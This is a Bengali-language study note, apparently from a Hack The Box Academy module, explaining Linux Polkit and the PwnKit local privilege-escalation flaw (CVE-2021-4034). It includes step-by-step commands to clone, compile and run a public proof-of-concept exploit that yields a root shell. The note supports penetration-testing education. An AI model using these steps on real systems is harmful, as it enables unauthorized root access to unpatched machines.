# Polkit - [LINK](https://academy.hackthebox.com/app/module/51/section/1591)


লিনাক্স-ভিত্তিক অপারেটিং সিস্টেমে **Polkit (PolicyKit)** হলো একটি অথরাইজেশন সার্ভিস বা অনুমোদন ব্যবস্থা। এর প্রধান কাজ হলো সাধারণ ইউজারের সফটওয়্যার এবং সিস্টেমের কোর কম্পোনেন্টগুলোর মধ্যে যোগাযোগের ক্ষেত্রে অনুমোদনের বিষয়টি যাচাই করা।

সহজ কথায়, কোনো সাধারণ ইউজার যখন সিস্টেমের কোনো পরিবর্তন করতে চায়, তখন পলকিট চেক করে দেখে যে ওই ইউজারের এই কাজটি করার অনুমতি আছে কিনা।

পলকিট দিয়ে খুব নিখুঁতভাবে পারমিশন সেট করা যায়। যেমন:

* কাজটি সবার জন্য উন্মুক্ত থাকবে নাকি সম্পূর্ণ নিষিদ্ধ থাকবে।
* কাজটির জন্য অ্যাডমিন পাসওয়ার্ড লাগবে নাকি শুধু ইউজারের নিজের পাসওয়ার্ড দিলেই হবে।
* পারমিশনটি কি একবারের জন্য, নির্দিষ্ট সেশনের জন্য, নাকি আজীবনের জন্য দেওয়া হবে।

## ১. Polkit এর ফাইল স্ট্রাকচার

পলকিট মূলত দুটি প্রধান ফাইল গ্রুপ নিয়ে কাজ করে:

1. **Actions / Policies (পলিসি বা নিয়মকানুন):** এগুলো `/usr/share/polkit-1/actions` ডিরেক্টরিতে থাকে।
2. **Rules (রুলস বা বিধিমালা):** এগুলো `/usr/share/polkit-1/rules.d` ডিরেক্টরিতে থাকে।

এছাড়াও পলকিটের "Local Authority" রুলস থাকে, যা দিয়ে অ্যাডমিনরা ইউজার বা গ্রুপের জন্য কাস্টম পারমিশন তৈরি করতে পারেন। এই কাস্টম রুলসগুলো `/etc/polkit-1/localauthority/50-local.d` ফোল্ডারে রাখা হয় এবং ফাইলের এক্সটেনশন হয় `.pkla`।

## ২. Polkit এর টুলস

পলকিটের সাথে ডিফল্টভাবে তিনটি গুরুত্বপূর্ণ প্রোগ্রাম বা কমান্ড-লাইন টুল থাকে:

| টুলের নাম | কাজ (Description) |
| --- | --- |
| **pkexec** | এটি `sudo` এর মতোই কাজ করে। এটি দিয়ে এক ইউজারের ক্ষমতা নিয়ে অন্য ইউজারের (বা রুটের) প্রোগ্রাম রান করানো যায়। |
| **pkaction** | সিস্টেমে কী কী পলকিট অ্যাকশন বা পারমিশন আছে, তা দেখার জন্য এটি ব্যবহৃত হয়। |
| **pkcheck** | কোনো নির্দিষ্ট প্রসেস বা কাজের জন্য ইউজারের অনুমতি আছে কিনা, তা চেক করতে এটি ব্যবহৃত হয়। |

আমাদের হ্যাকিং বা প্রিভিলেজ এসকালেশনের জন্য সবচেয়ে আকর্ষণীয় টুলটি হলো **`pkexec`**।

**pkexec ব্যবহারের নিয়ম:**

```bash
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)

```

এখানে আমরা দেখতে পাচ্ছি `pkexec` ব্যবহার করে রুট পারমিশন নিয়ে `id` কমান্ডটি রান করানো হয়েছে।

## ৩. The Vulnerability: Pwnkit (CVE-2021-4034)

২০২১ সালের নভেম্বরে `pkexec` টুলের ভেতরে একটি মারাত্মক মেমোরি করাপশন (Memory corruption) দুর্বলতা আবিষ্কৃত হয়, যা **Pwnkit** নামে হ্যাকার কমিউনিটিতে ব্যাপকভাবে পরিচিত।

সবচেয়ে অবাক করা বিষয় হলো, এই দুর্বলতাটি প্রায় ১০ বছরেরও বেশি সময় ধরে লিনাক্স সিস্টেমে লুকিয়ে ছিল এবং কেউ এটি ধরতে পারেনি! এই দুর্বলতা ব্যবহার করে যেকোনো সাধারণ ইউজার কোনো পাসওয়ার্ড বা বিশেষ কনফিগারেশন ছাড়াই সরাসরি সিস্টেমের রুট (Root) হয়ে যেতে পারে।

### এক্সপ্লয়টেশন (অ্যাটাক করার পদ্ধতি)

এই দুর্বলতাটি কাজে লাগানোর জন্য আমরা গিটহাব থেকে একটি প্রুফ-অফ-কনসেপ্ট (PoC) বা এক্সপ্লয়ট ডাউনলোড করে টার্গেট সিস্টেমে কম্পাইল করব।

**ধাপ ১: এক্সপ্লয়ট ডাউনলোড এবং কম্পাইল করা**
টার্গেট সিস্টেমে (বা কাছাকাছি এনভায়রনমেন্টে) কোডটি ক্লোন করে `gcc` দিয়ে কম্পাইল করতে হবে।

```bash
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc

```

**ধাপ ২: এক্সপ্লয়ট রান করা এবং রুট শেল নেওয়া**
কম্পাইল করা হয়ে গেলে আর কোনো কনফিগারেশনের প্রয়োজন নেই। শুধু বাইনারি ফাইলটি রান করলেই হবে।

```bash
cry0l1t3@nix02:~$ ./poc

# id
uid=0(root) gid=0(root) groups=0(root)

```
